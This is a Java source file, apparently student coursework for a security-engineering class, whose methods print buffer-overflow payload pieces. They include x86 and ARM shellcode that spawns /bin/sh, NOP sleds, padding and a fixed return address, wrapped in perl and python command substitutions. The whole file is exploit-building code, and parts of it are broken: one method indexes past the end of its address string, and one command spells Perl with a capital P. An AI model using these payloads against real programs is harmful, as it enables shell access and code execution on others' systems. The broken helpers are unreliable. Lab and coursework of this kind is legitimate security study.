/**
 * @author He Chen
 * @university King's College London
 * @ID 21044375
 */
public class Seceng {

    public static void byte18shellcodeGenerator() {
        String toDec = "\\x6a\\x0b\\x58\\x53\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80";
        String prefix = "$(perl -e 'print \"";
        String suffix = "\"')";
        StringBuffer fin = new StringBuffer();
        for (int i = 0; i <18 ; i++) {
            fin.append(prefix);
            fin.append(toDec.substring(i*4, (i+1)*4));
            fin.append(suffix);
            fin.append(i+140);
            fin.append(" ");
        }
        System.out.print(fin);
    }


    public static void shellcodeGenerator() {
        String toDec = "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80";
        String prefix = "$(perl -e 'print \"";
        String suffix = "\"')";
        StringBuffer fin = new StringBuffer();
        for (int i = 0; i <28 ; i++) {
            fin.append(prefix);
            fin.append(toDec.substring(i*4, (i+1)*4));
            fin.append(suffix);
            fin.append(i);
            fin.append(" ");
        }
        System.out.print(fin);
    }

    public static void pyshellcodeGenerator() {
        String toDec = "\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80";
        String prefix = "$(python -c \"print '";
        String suffix = "'\")";
        StringBuffer fin = new StringBuffer();
        for (int i = 0; i <28 ; i++) {
            fin.append(prefix);
            fin.append(toDec.substring(i*4, (i+1)*4));
            fin.append(suffix);
            fin.append(i);
            fin.append(" ");
        }
        System.out.print(fin);
    }

    public static void agenerator() {
        StringBuffer sb = new StringBuffer();
        for (int i = 0; i < 28; i++) {
            sb.append("A"+i+" ");
        }
        for (int i = 28; i < 32; i++) {
            sb.append("a"+i+50+" ");
        }
        System.out.print(sb);
    }

    public static void allagenerator() {
        StringBuffer sb = new StringBuffer();
        for (int i =50; i < 82; i++) {
            sb.append("A"+i+" ");
        }
        System.out.print(sb);
    }


    public static void nopsledgenerator() {
        StringBuffer sb = new StringBuffer();
        String nop = "$(perl -e 'print \"\\x90\"')";
        for (int i = 40; i < 140; i++) {
            sb.append(nop).append(i).append(" ");
        }
        System.out.print(sb);
    }

    public static void addressgenerator() {
        String toDec = "\\x50\\xda\\x83\\xbf";
        String prefix = "$(perl -e 'print \"";
        String suffix = "\"')";
        StringBuffer fin = new StringBuffer();
        for (int i =28; i <32 ; i++) {
            fin.append(prefix);
            fin.append(toDec.substring(i*4, (i+1)*4));
            fin.append(suffix);
            fin.append(i);
            fin.append(" ");
        }
        System.out.print(fin);
    }


    public static void shellcodeGeneratorWithNop() {
        //\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
        String shellcode = "\\x6a\\x31\\x58\\x31\\xd2\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x6a\\x46\\x58\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x89\\xd1\\xcd\\x80";
        String shellcode2 = "\\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x24\\x1b\\x20\\x1c\\x17\\x27\\x01\\xdf\\x78\\x46\\x0a\\x30\\x01\\x90\\x01\\xa9\\x92\\x1a\\x0b\\x27\\x01\\xdf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68";
        System.out.println("$(Perl -e 'print \"\\x90\"x100000; print \" \\x01\\x30\\x8f\\xe2\\x13\\xff\\x2f\\xe1\\x24\\x1b\\x20\\x1c\\x17\\x27\\x01\\xdf\\x78\\x46\\x0a\\x30\\x01\\x90\\x01\\xa9\\x92\\x1a\\x0b\\x27\\x01\\xdf\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\"')");

    }

}
